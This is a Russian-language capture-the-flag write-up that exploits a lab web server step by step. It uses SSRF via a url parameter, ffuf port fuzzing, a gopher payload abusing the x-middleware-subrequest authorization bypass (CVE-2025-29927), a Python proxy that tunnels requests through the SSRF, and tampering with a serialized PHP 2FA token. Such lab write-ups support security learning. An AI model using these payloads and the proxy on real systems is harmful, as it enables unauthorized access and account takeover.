Исследуем сайт и находим страницу которая требует параметр ?url

![](../attachment/Pasted%20image%2020251025141605.png)

Проверим возможность SSRF,gopher и  локального обращения

![](../attachment/Pasted%20image%2020251025141613.png)
![](../attachment/Pasted%20image%2020251029142032.png)

Проводя дальнейший анализ сайта, проверим наличие портов на локальном адресе

```
ffuf -u http://10.10.195.254/preview.php?url=http://127.0.0.1:FUZZ -w ~/Desktop/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt -fw 1
```

![](../attachment/Pasted%20image%2020251025141823.png)
Находим порт 10000, по которому открывается возможность посмотреть API но требуется авторизация

![](../attachment/Pasted%20image%2020251025141851.png)

Находим информация о CVE-2025-29927, которая позволяет обойти авторизацию используя заголовок  x-middleware-subrequest
С помощью gopher отправим запрос. В ответе получим первый флаг и информацию что API не работает и следует обращаться к management используя указанную учетную запись


```
gopher://127.0.0.1:10000/_GET%2520%2fcustomapi%2520HTTP%2f1.1%250d%250aHost:%2520127.0.0.1:10000%250d%250ax-middleware-subrequest:%2520middleware%250d%250a
```

![](../attachment/Pasted%20image%2020251029143610.png)

Страница management недоступна по порту 10000, но активна на 80 порту
![[../Pasted image 20251029145315.png]]
![](../attachment/Pasted%20image%2020251029145309.png)
При отправке gopher запроса выдает код 301 с учетными данными.
Создаем прокси который перенаправит наш запрос к 127.0.0.1:5000 на 10.10.209.131:80 и закодирует запрос для работы с gopher
```
#!/usr/bin/env python3
import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.209.131"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 80

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```

Запускаем созданный прокси и используем ранее полученные данные для входа

![](../attachment/Pasted%20image%2020251029151755.png)

Открывается страница с 2FA

![](../attachment/Pasted%20image%2020251029151821.png)

При анализе странице находим auth_token который выглядит как сериализованный объект PHP, в котором b:0 означется false. Исправим 0 на 1 и отправим запрос

![](../attachment/Pasted%20image%2020251029151853.png)

Успешно получаем второй флаг

![](../attachment/Pasted%20image%2020251029152029.png)
